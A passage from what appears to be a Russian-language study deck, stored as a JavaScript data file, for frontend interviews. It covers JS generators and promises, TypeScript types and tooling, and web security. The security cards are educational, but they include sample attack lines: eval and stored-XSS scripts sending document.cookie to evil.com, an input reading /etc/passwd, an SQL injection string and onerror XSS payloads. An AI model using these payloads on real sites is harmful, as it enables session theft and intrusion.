• **Iterable** — объект с методом [Symbol.iterator]() возвращающим итератор
• **Iterator** — объект с методом next() возвращающим { value, done }

**Ручная реализация итератора:**
\`\`\`js
const iterable = {
  [Symbol.iterator]() {
    let i = 0;
    return {
      next() {
        return i < 3
          ? { value: i++, done: false }
          : { value: undefined, done: true };
      }
    };
  }
};
\`\`\`

**Генератор** — автоматически реализует оба протокола:
\`\`\`js
function* gen() {
  const x = yield 'first';  // строка 1
  const y = yield 'second'; // строка 2
  return x + y;             // строка 3
}
const g = gen();
\`\`\`

**g.next()** — запуск (первый аргумент всегда игнорируется):
• Идёт до первого yield, возвращает \`{ value: 'first', done: false }\`
• Заморожен на строке 1

**g.next('world')** — продолжение:
• 'world' → результат yield 'first' → x = 'world'
• Идёт до следующего yield, возвращает \`{ value: 'second', done: false }\`

**g.next('!')** — продолжение:
• '!' → результат yield 'second' → y = '!'
• Идёт до return, возвращает \`{ value: 'world!', done: true }\`

**Правило:** то что передаёшь в next() — становится результатом предыдущего yield.

**yield* — делегирование:**
\`\`\`js
function* outer() {
  yield 0;
  yield* [1, 2, 3];  // массив
  yield* 'abc';       // строка
  yield* inner();     // другой генератор
}
[...outer()]; // [0, 1, 2, 3, 'a', 'b', 'c']
\`\`\`

**Что работает с итерируемыми:** for...of, [...spread], Array.from(), деструктуризация.
**Встроенные итерируемые:** Array, String, Map, Set, arguments, NodeList, генераторы.

**Практика:**
\`\`\`js
function* idGenerator() {
  let id = 1;
  while (true) yield id++;
}

function* range(start, end) {
  while (start <= end) yield start++;
}
for (const num of range(1, 5)) console.log(num); // 1 2 3 4 5
\`\`\`

**Применение:** Redux-Saga, бесконечные последовательности, ленивые вычисления. async/await под капотом — Babel компилирует в генераторы + промисы.`,score:2.5},{name:"Работа с запросами",level:"2",content:`**Промисы — цепочки:**
• .then() и .catch() всегда возвращают новый промис
• Ошибка пропускает все .then() до ближайшего .catch()
• .catch() без throw — «чинит» цепочку
• .finally() — всегда, не получает аргументов, пропускает значение дальше

**promise.then(ok, err) vs promise.then(ok).catch(err):**
В первом: err НЕ ловит ошибки из ok. Во втором: catch ловит всё.

**Promise combinators:**
\`\`\`js
// Все выполнятся — вернёт массив результатов. Один reject → всё reject.
const [user, posts] = await Promise.all([fetchUser(id), fetchPosts(id)]);

// Все выполнятся — вернёт массив { status, value/reason }. Никогда не reject.
const results = await Promise.allSettled([req1(), req2(), req3()]);
const ok = results.filter(r => r.status === 'fulfilled').map(r => r.value);

// Первый завершившийся (resolve ИЛИ reject) побеждает.
const data = await Promise.race([fetchFromPrimary(), fetchFromFallback()]);

// Первый resolve побеждает. Reject только если ВСЕ упали (AggregateError).
const fastest = await Promise.any([cdn1(), cdn2(), cdn3()]);
\`\`\`

**AbortController** — отмена fetch и любых async операций:
\`\`\`js
const controller = new AbortController();

fetch('/api/data', { signal: controller.signal })
  .catch(e => { if (e.name !== 'AbortError') throw e; });

controller.abort(); // отмена

// В React — отменяем при размонтировании (обязательный паттерн!)
useEffect(() => {
  const controller = new AbortController();
  fetch('/api', { signal: controller.signal }).then(setData);
  return () => controller.abort();
}, []);
\`\`\``}]},{id:"ts",title:"TS",icon:"🔷",color:"#3178C6",topics:[{name:"Основные типы данных в TS",level:"2",content:`**Примитивы:** string, number, boolean, null, undefined, bigint, symbol.

**TS-specific:**
• **any** — отключает проверку
• **unknown** — безопасный any, требует проверки типа
• **never** — функция никогда не завершится (throw, while(true))
• **void** — функция ничего не возвращает
• **tuple** — массив фиксированной длины: [string, number]
• **enum** — набор именованных констант`,score:3},{name:"Keyof, typeof",level:"2",content:`**keyof** — union ключей: keyof User → 'name' | 'age' (НЕ string!)
**typeof** (в TS) — выводит тип из значения: typeof user → { name: string; age: number }

**Комбинация:** keyof typeof obj → union ключей из значения.`,score:3.5},{name:"Interface vs types (extend, |, &)",level:"3",content:`**interface** — declaration merging (повторное объявление объединяется), extends.
**type** — расширение через &, union |, mapped types, conditional types.

**Union (|):** A или B (или оба).
**Intersection (&):** обязательно A и B.

type тоже можно implements в классах.`,score:3.5},{name:"Файлы деклараций .d.ts",level:"3",content:`**.d.ts** — файл только с типами, без реализации. TypeScript читает его чтобы знать что экспортирует модуль, но в JS-бандл он не попадает.

**Зачем нужны:**
JS-библиотека написана на JS — TypeScript не знает её типы. .d.ts даёт ему эту информацию. Можно типизировать любой JS-код не переписывая его.

**Три источника .d.ts:**

**1. Встроены в саму библиотеку** — авторы написали на TypeScript и скомпилировали:
\`\`\`json
// package.json библиотеки
{ "types": "./dist/index.d.ts" }
\`\`\`
TS находит это автоматически.

**2. @types/* пакеты** — отдельный пакет с декларациями для JS-библиотек:
\`\`\`bash
npm i -D @types/react @types/node
\`\`\`
PostedBy сообщество DefinitelyTyped. Устанавливаются как devDependency — в продакшн-бандл не попадают.

**3. Написаны вручную** — для своего JS-кода или внутренних модулей:
\`\`\`ts
// legacy.d.ts — типизируем старый JS-модуль
declare module './legacy/utils' {
  export function formatDate(date: Date): string;
  export function parseId(id: unknown): number;
}
\`\`\`

**declare — ключевое слово в .d.ts:**
Говорит TS "это существует в рантайме, доверяй мне":
\`\`\`ts
// Объявить переменную без значения:
declare const __DEV__: boolean;        // например, вшитая webpack-ом
declare function require(id: string): any;

// Объявить модуль (любой импорт этого пути → any):
declare module '*.svg' {
  const src: string;
  export default src;
}

// Объявить модуль с типами:
declare module 'my-lib' {
  export interface Options { timeout: number; }
  export function init(opts: Options): void;
}
\`\`\`

**declare global — расширение глобального namespace:**
\`\`\`ts
// Добавить свойство к window:
declare global {
  interface Window {
    analytics: Analytics;
    __APP_CONFIG__: AppConfig;
  }
}

// Или расширить существующий тип:
declare global {
  interface Array<T> {
    groupBy(key: keyof T): Record<string, T[]>;
  }
}
\`\`\`
Важно: declare global работает только внутри module-файла (с import/export). В глобальном файле — просто interface Window.

**Автогенерация .d.ts из своего кода:**
\`\`\`json
// tsconfig.json
{ "declaration": true, "declarationDir": "./dist/types" }
\`\`\`
При сборке библиотеки tsc генерирует .d.ts автоматически рядом с JS-файлами. Потребители получат типы без @types.

**Нюанс — ambient vs module declarations:**
Если .d.ts файл не содержит import/export — он ambient (глобальный), типы доступны везде без импорта. Если содержит import/export — это module, типы нужно импортировать явно.`,score:3},{name:"Механизм typeGuard, type cast",level:"3",content:"**Type Guard:** функция с type predicate:\n```ts\nfunction isCat(x: Cat | Dog): x is Cat { return 'meow' in x; }\n```\n\n**Type Cast:** as (основной) и <Type> (не работает в JSX).\nЭто утверждение, не преобразование — в рантайме ничего не происходит.",score:3.5},{name:"UtilityTypes",level:"3",content:`**Partial<T>** — все поля необязательны
**Required<T>** — все поля обязательны
**Readonly<T>** — все поля только для чтения
**Pick<T, K>** — выбирает поля K из T
**Omit<T, K>** — исключает поля K из T
**Record<K, V>** — объект с ключами K и значениями V
**Exclude<T, U>** — убирает из union T типы из U
**Extract<T, U>** — оставляет в union T только типы из U
**NonNullable<T>** — убирает null и undefined
**ReturnType<T>** — тип возврата функции
**Parameters<T>** — типы параметров функции как tuple
**InstanceType<T>** — тип экземпляра класса
**Awaited<T>** — разворачивает Promise
**ConstructorParameters<T>** — типы параметров конструктора`,score:4},{name:"Generics",level:"3",content:"Переиспользуемый код с разными типами:\n```ts\nfunction first<T>(arr: T[]): T { return arr[0]; }\n```\n\n**Ограничения (extends):**\n```ts\nfunction getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {\n  return obj[key]; // TypeScript знает тип возврата\n}\n```\n\n**Дефолтные типы:**\n```ts\ninterface State<T = string> { value: T; }\ntype State1 = State;         // State<string>\ntype State2 = State<number>; // State<number>\n```\n\n**Conditional generics (зависимый возврат):**\n```ts\ntype Flatten<T> = T extends Array<infer Item> ? Item : T;\ntype A = Flatten<string[]>; // string\ntype B = Flatten<number>;   // number\n```\n\n**Variance (вариантность):**\n- **Covariant (ковариантный):** `Dog extends Animal` → `() => Dog` совместим с `() => Animal` (return types — ковариантны)\n- **Contravariant (контравариантный):** `(Animal) => void` → несовместим с `(Dog) => void` (параметры — контравариантны со `strictFunctionTypes`)\n```ts\ntype Logger<T> = (value: T) => void;\n// Если нужен Logger<Animal>, можно передать Logger<Animal>\n// но НЕ Logger<Dog> — т.к. Logger<Animal> ожидает любой Animal\n```",score:4},{name:"Template Literal Types",level:"3",content:`Строковые шаблоны в типах:
\`\`\`ts
type Event = 'click' | 'hover';
type Handler = \\\`on\${Capitalize<Event>}\\\`; // 'onClick' | 'onHover'
\`\`\`

Автоматическая генерация всех комбинаций из union. 
      **Capitalize<T>** — первая буква заглавная: 'hello' → 'Hello'
**Uncapitalize<T>** — первая буква строчная: 'Hello' → 'hello'
**Uppercase<T>** — всё заглавными: 'hello' → 'HELLO'
**Lowercase<T>** — всё строчными: 'HELLO' → 'hello'`,score:3.5},{name:"Conditional types, mapped types, infer",level:"4",content:`**Conditional:** T extends string ? 'yes' : 'no'
**Mapped:** [K in keyof T]?: T[K] — перебор ключей с трансформацией.
**infer:** вытаскивает тип из структуры:
\`\`\`ts
type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;
\`\`\`

**Distributive (разворачивается по union):**
\`\`\`ts
type ToArray<T> = T extends any ? T[] : never;
type A = ToArray<string | number>; // string[] | number[]

// Чтобы ОТКЛЮЧИТЬ distributive — обернуть в кортеж:
type ToArrayStrict<T> = [T] extends [any] ? T[] : never;
type B = ToArrayStrict<string | number>; // (string | number)[]
\`\`\`

**Mapped type modifiers (+/-):**
\`\`\`ts
type Mutable<T> = { -readonly [K in keyof T]: T[K] };   // убрать readonly
type Optional<T> = { [K in keyof T]+?: T[K] };           // добавить ?
type Required<T> = { [K in keyof T]-?: T[K] };           // убрать ?
\`\`\`

**infer для сложных структур:**
\`\`\`ts
type Unpacked<T> = T extends Promise<infer U> ? U : T;
type Head<T extends any[]> = T extends [infer H, ...any[]] ? H : never;
type Tail<T extends any[]> = T extends [any, ...infer R] ? R : never;

type H = Head<[string, number, boolean]>; // string
type T = Tail<[string, number, boolean]>; // [number, boolean]
\`\`\``,score:3},{name:"Перегрузка функций",level:"4",content:`**Зачем нужна перегрузка:**
Иногда функция ведёт себя по-разному в зависимости от типа аргументов — и возвращаемый тип тоже разный. Без перегрузки TypeScript вывел бы слишком широкий тип и потерял информацию:
\`\`\`ts
// Без перегрузки — TS не знает что именно вернётся:
function wrap(value: string | number): string | number[] { ... }
const result = wrap('hello'); // тип: string | number[] — неточно

// С перегрузкой — TS знает точно:
function wrap(value: string): string;
function wrap(value: number): number[];
function wrap(value: string | number): string | number[] {
  return typeof value === 'string' ? value.toUpperCase() : [value];
}
const a = wrap('hello'); // тип: string ✅
const b = wrap(42);     // тип: number[] ✅
\`\`\`

**Структура:**
\`\`\`ts
// 1. Сигнатуры перегрузок — только для TypeScript, в JS не существуют:
function format(value: string): string;
function format(value: number, decimals: number): string;

// 2. Сигнатура реализации — невидима снаружи, покрывает все варианты:
function format(value: string | number, decimals?: number): string {
  if (typeof value === 'string') return value.trim();
  return value.toFixed(decimals ?? 2);
}

// Вызвать можно только через сигнатуры перегрузок:
format('hello');    // ✅
format(3.14, 1);    // ✅
format(3.14);       // ❌ — не совпадает ни с одной сигнатурой
\`\`\`

**Порядок сигнатур важен — конкретные выше:**
\`\`\`ts
// ✅ Правильно: более конкретный тип выше
function parse(input: 'json'): object;
function parse(input: string): unknown;
function parse(input: string): object | unknown { ... }

// ❌ Неправильно: string поглощает 'json' раньше
function parse(input: string): unknown;
function parse(input: 'json'): object; // никогда не будет выбрана
\`\`\`

**Перегрузка методов класса:**
\`\`\`ts
class EventEmitter {
  on(event: 'data', handler: (data: Buffer) => void): this;
  on(event: 'error', handler: (err: Error) => void): this;
  on(event: string, handler: (...args: any[]) => void): this {
    // реализация
    return this;
  }
}
\`\`\`

**Когда использовать перегрузку, а когда union:**
\`\`\`ts
// Union достаточно — возвращаемый тип не зависит от входного:
function log(value: string | number): void { ... }

// Перегрузка нужна — возвращаемый тип зависит от входного:
function clone(value: string): string;
function clone(value: number): number;
function clone<T>(value: T): T { return value; }
\`\`\`

**Альтернатива — generic с conditional type** (мощнее, но сложнее читается):
\`\`\`ts
function clone<T extends string | number>(value: T): T {
  return value; // TS сохраняет литеральный тип
}
const x = clone('hello'); // тип: 'hello', не string
\`\`\``,score:3},{name:"Reference types",level:"4",content:`Reference types — директивы в начале файла для подключения типов:

**Triple-slash directives:**
\`\`\`ts
/// <reference types="node" />          // подключает @types/node
/// <reference path="./other.d.ts" />   // подключает конкретный файл
/// <reference lib="dom" />             // подключает встроенную библиотеку TS
\`\`\`

В tsconfig.json можно указать \`types\` или \`lib\` глобально для всего проекта.

**Reference директивы нужны когда:**
• Нужен тип только в одном файле — не хочешь подключать глобально
• Автоматически генерируемые .d.ts — компилятор сам добавляет reference чтобы указать зависимости
• Старые проекты — до того как tsconfig стал стандартом

Сейчас в большинстве проектов reference директивы не нужны — всё настраивается через tsconfig.json.`,score:3.5},{name:"Использование tsc",level:"4",content:`**tsc** — компилятор TypeScript. Проверяет типы + компилирует в JS.

**tsconfig.json ключевые настройки:**
• **strict: true** — зонтичный флаг (strictNullChecks, noImplicitAny, и др.)
• **target** — версия JS на выходе (ES5, ES6, ESNext)
• **module** — система модулей (commonjs, esnext)
• **paths** — алиасы импортов
• **include/exclude** — какие файлы компилировать

**strict: true включает:**
• **noImplicitAny** — нельзя неявный any
• **strictNullChecks** — null и undefined не совместимы с другими типами
• **strictFunctionTypes** — строгая проверка типов функций при присваивании
• **strictPropertyInitialization** — все поля класса должны быть инициализированы в конструкторе

**--noEmit** — проверяет типы но не генерирует JS файлы. Используется:
• В CI/CD для проверки типов без сборки
• Когда сборкой занимается другой инструмент (Vite, webpack) а TS только для типов
\`\`\`bash
tsc --noEmit         # только проверка типов
tsc --watch          # следит за изменениями
tsc --noEmit --watch # проверка типов в режиме слежения
\`\`\``,score:3.5}]},{id:"security",title:"БЕЗОПАСНОСТЬ",icon:"🔒",color:"#EF5350",topics:[{name:"eval, dangerouslySetInnerHTML",level:"2",content:`**eval() — выполняет строку как JS-код в рантайме:**
\`\`\`js
eval('alert(1)');              // выполнит alert
eval('fetch("evil.com?" + document.cookie)'); // украдёт куки
\`\`\`

**Почему опасно:**
Если в строку попадают пользовательские данные — атакующий может выполнить любой код с привилегиями текущей страницы: украсть cookies/localStorage, делать запросы от имени пользователя, менять DOM.

**Почему медленно:**
V8 не может оптимизировать код внутри eval — Hidden Classes, Inline Caching, JIT не работают. Плюс eval читает и модифицирует текущий scope — это блокирует ряд оптимизаций всей окружающей функции.

**Альтернативы:**
\`\`\`js
// Вместо eval для вычисления выражений:
new Function('x', 'return x * 2')(5); // изолирован от текущего scope

// Вместо eval для динамических ключей:
const key = 'name';
obj[key]; // просто доступ через переменную

// Вместо eval для JSON:
JSON.parse(str); // безопасно, только данные — не код
\`\`\`
\`new Function()\` тоже небезопасен для пользовательского ввода — изолирует от scope, но всё равно выполняет произвольный код.

---

**dangerouslySetInnerHTML — React-аналог innerHTML:**
\`\`\`jsx
// ❌ Опасно — если html пришёл от пользователя:
<div dangerouslySetInnerHTML={{ __html: userContent }} />
// Если userContent = '<img src=x onerror=alert(1)>' — XSS
\`\`\`

**Санитизация (sanitize)** — это очистка HTML от опасных тегов и атрибутов перед вставкой в DOM. Санитайзер парсит HTML и удаляет: теги \`<script>\`, обработчики событий (\`onerror\`, \`onclick\`, \`onload\`), \`javascript:\` в href/src, и другие векторы XSS.

**DOMPurify — стандартная библиотека для санитизации:**
\`\`\`js
import DOMPurify from 'dompurify';

// Базовое использование:
const clean = DOMPurify.sanitize(dirtyHtml);
// '<script>alert(1)<\/script><b>text</b>' → '<b>text</b>'
// '<img src=x onerror=alert(1)>' → '<img src=x>'

// Разрешить только определённые теги:
const clean = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
});
\`\`\`

\`\`\`jsx
// ✅ Правильно — всегда санитизировать перед вставкой:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
\`\`\`

**Когда dangerouslySetInnerHTML вообще нужен:**
• Вывод rich-text из CMS (контент редактора — Quill, TipTap)
• Email-превью в браузере
• Статьи с форматированием из базы

Во всех случаях — только с санитизацией. React специально назвал пропс "dangerously" чтобы разработчик думал дважды.`,score:3.5},{name:"Аутентификация и авторизация, их отличия",level:"2",content:`**Аутентификация (Authentication)** — КТО ты? Проверка личности. Логин/пароль, OAuth, биометрия, токен.

**Авторизация (Authorization)** — ЧТО тебе можно? Проверка прав после того как личность установлена. Роли, permissions, scopes.

Сначала всегда аутентификация — потом авторизация. Без установленной личности незачем проверять права.

---

**Session-based аутентификация:**
\`\`\`
1. Пользователь вводит логин/пароль
2. Сервер проверяет, создаёт сессию в БД/Redis: { sessionId: 'abc', userId: 42, exp: ... }
3. Клиент получает httpOnly cookie с sessionId
4. При каждом запросе браузер автоматически шлёт cookie
5. Сервер смотрит sessionId → находит сессию → знает кто это
\`\`\`
Инвалидация мгновенная — удалил запись в Redis, сессия мертва. Минус: нужен общий Redis при горизонтальном масштабировании.

**JWT-аутентификация:**
\`\`\`
1. Пользователь логинится
2. Сервер создаёт JWT: header.payload.signature
3. Клиент хранит токен и шлёт в заголовке: Authorization: Bearer <token>
4. Сервер проверяет подпись — никакой БД не нужно (stateless)
\`\`\`
\`\`\`js
// Payload JWT (читаем кем угодно — не шифруется!):
{ userId: 42, role: 'admin', exp: 1716000000 }
\`\`\`
Плюс: stateless, легко масштабируется. Минус: нельзя мгновенно инвалидировать — токен живёт до истечения exp.

**Где хранить токены:**

**localStorage** — доступен из JS → украдут через XSS. Нельзя для access/refresh токенов.

**httpOnly cookie** — JS не может прочитать, браузер шлёт автоматически. Уязвим к CSRF, но защищается SameSite=Strict/Lax.

**In-memory (переменная в JS)** — самый безопасный для access token. Но теряется при перезагрузке страницы.

**Token rotation паттерн (лучшая практика):**
\`\`\`
access token  → 15 мин, хранить in-memory
refresh token → 7 дней, хранить в httpOnly cookie
\`\`\`
\`\`\`js
// access истёк → отправляем refresh token:
POST /auth/refresh
Cookie: refresh_token=xyz  // браузер шлёт автоматически

// Сервер:
// 1. Проверяет refresh token (хэш в БД)
// 2. Выдаёт новый access token
// 3. Ротирует refresh token (старый инвалидируется)
Response: { accessToken: 'new_jwt' }
\`\`\`
Ротация refresh при каждом обновлении — если украли refresh, его использование сразу видно (старый уже невалиден).

---

**OAuth 2.0** — протокол делегированной авторизации. Позволяет дать приложению доступ к ресурсам пользователя без передачи пароля.

**Authorization Code + PKCE** — стандартный flow для SPA и мобильных:
\`\`\`
1. Редирект на OAuth-провайдер (Google, GitHub)
2. Пользователь логинится у провайдера → соглашается дать доступ
3. Провайдер редиректит обратно с code
4. Клиент меняет code на access token (+ PKCE проверка)
5. Используем access token для API
\`\`\`
PKCE (Proof Key for Code Exchange) — защита от перехвата code: клиент генерирует случайный code_verifier, шлёт его хэш при старте, и сам verifier при обмене.

**Client Credentials** — server-to-server, без пользователя:
\`\`\`
POST /oauth/token
{ client_id, client_secret, grant_type: 'client_credentials' }
→ access token
\`\`\`
Микросервисы, фоновые задачи, cron-джобы.

**Implicit flow** — устарел, небезопасен. Токен приходил прямо в URL — виден в логах, истории браузера. Заменён на Authorization Code + PKCE.`,score:4},{name:"npm audit. SCA и SAST",level:"2",content:`**Почему зависимости — зона риска:**
Типичное React-приложение тянет 500-1000 пакетов транзитивно. Уязвимость в любом из них — потенциальный вектор атаки. Атаки на supply chain (цепочку поставок) — один из главных векторов последних лет: атакуют не твой код, а пакет который ты используешь.

**npm audit:**
Сравнивает дерево зависимостей с базой CVE (Common Vulnerabilities and Exposures). Показывает уязвимость, severity (low/moderate/high/critical), и через какой пакет она попадает.
\`\`\`bash
npm audit                  # показать все уязвимости
npm audit --audit-level=high  # выйти с ошибкой только при high/critical
npm audit fix              # обновить уязвимые пакеты (только semver-совместимые)
npm audit fix --force      # обновить даже с breaking changes — опасно
\`\`\`
\`npm audit fix --force\` может сломать приложение — пакет обновится до мажорной версии с другим API. Делать только осознанно с последующим тестированием.

**SCA (Software Composition Analysis)** — автоматизированный анализ зависимостей на уязвимости и лицензионные проблемы:
• **npm audit** — встроен в npm, базовый уровень
• **Snyk** — глубже чем npm audit, находит уязвимости которые audit пропускает, интегрируется в CI
• **Dependabot (GitHub)** — автоматически создаёт PR для обновления уязвимых пакетов

SCA отвечает на вопрос: *есть ли известные уязвимости в том что я использую?*

**SAST (Static Application Security Testing)** — анализ твоего собственного кода без его запуска. Ищет потенциально опасные паттерны:
• **ESLint + eslint-plugin-security** — находит eval(), небезопасные регулярки, объекты без hasOwnProperty
• **SonarQube / SonarCloud** — глубокий анализ: SQL injection, XSS, hardcoded secrets
• **Semgrep** — кастомные правила под свой стек

SAST отвечает на вопрос: *есть ли уязвимый код в том что я написал?*

SCA + SAST вместе — разные слои защиты: один смотрит на чужой код, другой на твой.

---

**Что именно ищет SAST — типичные паттерны:**

**SQL-инъекция — конкатенация пользовательского ввода в запрос:**
\`\`\`sql
-- Запрос на сервере:
SELECT * FROM users WHERE name = '$input'

-- Пользователь вводит: ' OR '1'='1
-- Итоговый запрос:
SELECT * FROM users WHERE name = '' OR '1'='1'
-- Возвращает ВСЕХ пользователей
\`\`\`
Защита — параметризованные запросы (prepared statements). Значение передаётся отдельно от SQL-кода — база данных их никогда не смешивает:
\`\`\`js
// ❌ Конкатенация — уязвимо:
db.query(\`SELECT * FROM users WHERE name = '\${input}'\`);

// ✅ Параметризованный запрос — безопасно:
db.query('SELECT * FROM users WHERE name = ?', [input]);
// или с именованными параметрами (Postgres):
db.query('SELECT * FROM users WHERE name = $1', [input]);
\`\`\`

**Небезопасный eval с пользовательским вводом:**
\`\`\`js
// Пользователь передаёт строку:
const input = "require('fs').readFileSync('/etc/passwd')";
eval(input); // выполнит — прочитает системные файлы
\`\`\`
SAST видит \`eval(\` + переменная = потенциальная уязвимость. Никогда не передавать пользовательский ввод в eval.

**Захардкоженные секреты:**
\`\`\`js
// ❌ Плохо — секреты в коде:
const API_KEY = 'sk-1234567890abcdef'; // попадёт в git историю
const DB_PASSWORD = 'super_secret';

// ✅ Хорошо — через переменные окружения:
const API_KEY = process.env.API_KEY;
const DB_PASSWORD = process.env.DB_PASSWORD;
\`\`\`
SAST ищет паттерны \`password =\`, \`api_key =\`, \`secret =\`, токены в виде строк. Инструменты: truffleHog, git-secrets, GitHub secret scanning (встроен, сканирует автоматически при пуше).

**Если секрет уже попал в git — удаление из кода не помогает.** Git история хранит всё. Нужно: немедленно инвалидировать секрет (отозвать ключ/пересоздать пароль), и опционально почистить историю через \`git filter-repo\`.`,score:3},{name:"Атрибут rel: noreferrer, noopener, nofollow",level:"3",content:'**Проблема без этих атрибутов:**\nПри открытии ссылки в новой вкладке (`target="_blank"`) новая страница получает доступ к `window.opener` — ссылке на вкладку которая её открыла. Атакующий может написать:\n```js\n// На evil.com, куда вела ссылка с вашего сайта:\nwindow.opener.location = \'https://fake-login.com\';\n// Пользователь смотрит на новую вкладку, а оригинальный сайт\n// незаметно заменился на фишинговую копию — это tabnabbing\n```\n\n**noopener** — блокирует доступ к `window.opener`. Новая вкладка открывается в отдельном процессе без связи с оригинальной:\n```html\n<a href="https://external.com" target="_blank" rel="noopener">\n```\n\n**noreferrer** — делает то же что noopener, плюс не передаёт заголовок `Referer`. Referer — это URL страницы, с которой пришёл пользователь. Без него внешний сайт не узнает откуда пришёл переход:\n```\n// Без noreferrer внешний сайт видит:\nReferer: https://yoursite.com/secret-page\n\n// С noreferrer — заголовок отсутствует\n```\nНорма: всегда писать `rel="noopener noreferrer"` вместе для target="_blank".\n\n**nofollow** — не про безопасность, а про SEO. Указание поисковым роботам не передавать «ссылочный вес» (PageRank) на эту страницу:\n```html\n<!-- Пользовательский контент, платные ссылки, недоверенные источники: -->\n<a href="https://sponsor.com" rel="nofollow">Реклама</a>\n```\nГугл требует nofollow для платных/рекламных ссылок — иначе это манипуляция поисковой выдачей.',score:3},{name:"CSP и X-Frame-Options",level:"3",content:`**CSP (Content Security Policy)** — HTTP-заголовок, который говорит браузеру откуда разрешено загружать ресурсы. Это второй рубеж защиты от XSS: даже если атакующий внедрил скрипт, браузер его не выполнит если домен не в белом списке.

**Почему нужен второй рубеж:**
Фильтрация и экранирование на сервере — первый рубеж. Но программисты делают ошибки. CSP — страховка: даже при пробитом первом рубеже инжектированный скрипт не запустится.

**Основные директивы:**
\`\`\`
Content-Security-Policy:
  default-src 'self';                    // по умолчанию — только свой домен
  script-src 'self' cdn.example.com;    // скрипты — свой домен + cdn
  style-src 'self' 'unsafe-inline';     // стили — свой домен + inline (нежелательно)
  img-src 'self' data: https:;          // картинки — свой домен + data URI + любой HTTPS
  connect-src 'self' api.example.com;  // fetch/XHR — свой домен + API
  font-src 'self' fonts.gstatic.com;   // шрифты
  frame-ancestors 'none';              // запрет встраивания в iframe (замена X-Frame-Options)
\`\`\`

**Inline-скрипты по умолчанию запрещены** — это ключевая защита. \`<script>alert(1)<\/script>\` из XSS не выполнится.

Если нужны inline-скрипты (React/Vite часто генерируют) — использовать nonce:
\`\`\`html
<!-- Сервер генерирует случайный nonce при каждом запросе -->
<script nonce="r4nd0m123">...<\/script>
\`\`\`
\`\`\`
Content-Security-Policy: script-src 'nonce-r4nd0m123';
\`\`\`

**Report-Only режим** — не блокирует, только сообщает о нарушениях. Используют для тестирования CSP перед включением:
\`\`\`
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
\`\`\`

**X-Frame-Options** — запрещает встраивание сайта в \`<iframe>\`. Защита от **clickjacking**: атакующий встраивает твой сайт в прозрачный iframe поверх своей страницы — пользователь думает что кликает по кнопке на чужом сайте, а на самом деле нажимает кнопку на твоём (например "Перевести деньги"):
\`\`\`
X-Frame-Options: DENY          // нельзя встроить нигде
X-Frame-Options: SAMEORIGIN    // только на своём домене
\`\`\`
Современная альтернатива: \`frame-ancestors\` директива в CSP — гибче, поддерживает несколько доменов.`,score:3.5},{name:"CORS",level:"3",content:`**Зачем вообще существует Same-Origin Policy:**
Браузер по умолчанию запрещает JS на одном домене читать ответы с другого. Без этого любой сайт мог бы в фоне делать запросы от твоего имени — читать почту, банковский счёт, отправлять формы. CORS — механизм, позволяющий серверу явно разрешить доступ с конкретных доменов.

**Origin = протокол + домен + порт.** Разные origin:
\`\`\`
https://site.com  vs  http://site.com    // разный протокол
https://site.com  vs  https://api.com    // разный домен
https://site.com  vs  https://site.com:8080  // разный порт
\`\`\`

**Простые запросы** (GET, POST с обычными заголовками) — браузер шлёт запрос с заголовком Origin, сервер отвечает с Access-Control-Allow-Origin. Если домен не совпадает — браузер блокирует чтение ответа (запрос дошёл до сервера, браузер просто не даёт JS прочитать результат).

**Preflight (предварительный запрос)** — для "сложных" запросов (PUT, DELETE, PATCH, кастомные заголовки типа Authorization): браузер сначала шлёт OPTIONS, спрашивая разрешение, и только при положительном ответе шлёт настоящий запрос:
\`\`\`
// Браузер автоматически:
OPTIONS /api/users
Origin: https://frontend.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization

// Сервер должен ответить:
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization
Access-Control-Max-Age: 86400  // кэшировать preflight на сутки
\`\`\`

**CORS с credentials — куки и Authorization через домены:**
По умолчанию браузер не отправляет куки на другой домен даже если CORS разрешён. Нужно явно включить с обеих сторон:
\`\`\`js
// Клиент — явно указать credentials:
fetch('https://api.site.com/data', {
  credentials: 'include', // отправлять куки!
});

// Или axios:
axios.get('https://api.site.com/data', {
  withCredentials: true,
});
\`\`\`
\`\`\`
// Сервер ОБЯЗАН ответить двумя заголовками:
Access-Control-Allow-Origin: https://mysite.com  // НЕ может быть *!
Access-Control-Allow-Credentials: true
\`\`\`
\`Access-Control-Allow-Origin: *\` + \`credentials: include\` — браузер заблокирует запрос. Это намеренное ограничение.

**Почему * нельзя с credentials — связь с CSRF:**
Если бы \`*\` работал с credentials, любой сайт мог бы делать запросы от имени пользователя с его куками. Это открыло бы дверь для CSRF-атак в обход SameSite-защиты. Требование конкретного домена означает что сервер осознанно доверяет именно этому источнику.

**CORS — это защита браузера, не сервера.** Curl или Postman не соблюдают CORS — они просто шлют запросы. CORS защищает от атак через браузер пользователя, не от прямых запросов к API.`,score:3.5},{name:"XSS",level:"3",content:"**XSS (Cross-Site Scripting)** — атака при которой вредоносный JS выполняется в браузере жертвы в контексте доверенного сайта. Атакующий получает те же права что и сам сайт: читает куки, localStorage, делает запросы от имени пользователя, меняет DOM.\n\n**Stored XSS (хранимый)** — скрипт сохраняется в БД и показывается всем пользователям:\n```\nАтакующий пишет комментарий: <script>fetch('evil.com?c='+document.cookie)<\/script>\nСервер сохраняет это в БД.\nДругой пользователь открывает страницу → браузер выполняет скрипт → куки улетают.\n```\nСамый опасный тип — автоматически поражает всех посетителей.\n\n**Reflected XSS (отражённый)** — скрипт передаётся в URL и сервер отражает его обратно в HTML:\n```\nhttps://site.com/search?q=<script>alert(1)<\/script>\nСервер: <h1>Результаты для: <script>alert(1)<\/script></h1>\n```\nЖертву нужно заставить перейти по специально сформированной ссылке (фишинг, спам).\n\n**DOM-based XSS** — сервер не при делах, уязвимость в клиентском JS:\n```js\n// Берём значение из URL и суём в DOM без проверки:\nconst name = location.hash.slice(1);\ndocument.getElementById('greeting').innerHTML = 'Привет, ' + name;\n// URL: https://site.com/page#<img src=x onerror=alert(1)>\n```\nОпасные источники: `location.hash`, `location.search`, `document.referrer`.\nОпасные получатели: `innerHTML`, `outerHTML`, `document.write`, `eval`.\n\n**Как React защищает по умолчанию:**\nJSX экранирует всё что выводится через `{}`. 